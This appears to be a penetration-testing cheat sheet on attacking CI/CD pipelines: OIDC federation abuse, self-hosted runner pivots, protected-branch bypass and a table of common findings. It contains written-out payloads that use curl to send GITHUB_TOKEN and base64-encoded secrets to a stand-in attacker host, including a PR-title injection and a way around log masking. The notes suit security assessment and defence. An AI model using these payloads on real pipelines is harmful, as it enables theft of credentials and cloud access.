# CI/CD Pipeline Attacks

## Attack Surface

| Platform | Secrets Location | OIDC Federation | Runner Risk |
|----------|-----------------|-----------------|-------------|
| GitHub Actions | Repository/Org secrets, OIDC tokens | AWS/GCP/Azure via `aws-actions/configure-aws-credentials` | Self-hosted = RCE on infra |
| GitLab CI | CI/CD Variables, Vault integration | GCP workload identity, AWS OIDC | Shared runners = isolation bypass |
| Azure DevOps | Variable Groups, Service Connections | Azure RM service connections | Agent pools with broad access |
| Jenkins | Credentials store, env vars in Jenkinsfile | Plugin-based cloud auth | Controller = keys to kingdom |

## GitHub Actions Exploitation

### Workflow Injection (PR-based)
```yaml
# Vulnerable pattern: uses PR title/body in run step
- run: echo "${{ github.event.pull_request.title }}"
# Inject: PR title = `"; curl attacker.com/$(cat $GITHUB_TOKEN) #`
```

### OIDC Federation Abuse
```bash
# If subject condition is too broad (e.g., repo:org/* instead of repo:org/repo:ref:refs/heads/main)
# Any workflow in the org can assume the production role
# Check: aws iam get-role --role-name <role> | jq '.Role.AssumeRolePolicyDocument'
# Look for: "token.actions.githubusercontent.com" with weak conditions
```

### Self-Hosted Runner Exploitation
```bash
# If you can trigger a workflow on a self-hosted runner:
# 1. Access cloud metadata (runner on EC2/GCE)
# 2. Read other repos' secrets (shared runner across repos)
# 3. Persist on the runner machine (no ephemeral cleanup)
# 4. Pivot to internal network (runner inside VPC)
```

### Secrets Extraction
```bash
# Secrets are masked in logs but can be exfiltrated:
# Base64 encode (bypasses masking)
- run: echo "${{ secrets.AWS_KEY }}" | base64
# Or via network
- run: curl https://attacker.com/?s=$(echo "${{ secrets.AWS_KEY }}" | base64)
```

## GitLab CI Exploitation

### Protected Branch Bypass
```bash
# Protected variables only available on protected branches
# If you can push to a protected branch (maintainer role) → access production secrets
# Check: Settings → CI/CD → Variables → "Protected" flag
```

### Shared Runner Escape
```bash
# GitLab shared runners use Docker-in-Docker or Kubernetes executors
# If privileged DinD: container escape techniques apply (see container-escape.md)
# If K8s executor: SA token in pod may have cluster access
```

## Common Findings

| Finding | Severity | Impact |
|---------|----------|--------|
| OIDC federation with wildcard subject | Critical | Any workflow assumes production role |
| Secrets in workflow logs (masking bypass) | High | Credential exposure |
| Self-hosted runner on production VPC | High | Network pivot to internal services |
| PR trigger with `pull_request_target` + checkout of PR code | Critical | Arbitrary code execution with repo secrets |
| Hardcoded credentials in pipeline config | High | Persistent access |
| No branch protection on deployment workflows | Medium | Unauthorized deployments |
| Shared runner across security boundaries | Medium | Cross-project secret access |

## Tools

| Tool | Purpose |
|------|---------|
| Gato | GitHub Actions exploitation |
| gh (CLI) | Workflow enumeration, secret detection |
| trufflehog | Scan git history for secrets |
| Legitify | GitHub/GitLab org security posture |
| Poutine | CI/CD pipeline security scanner |
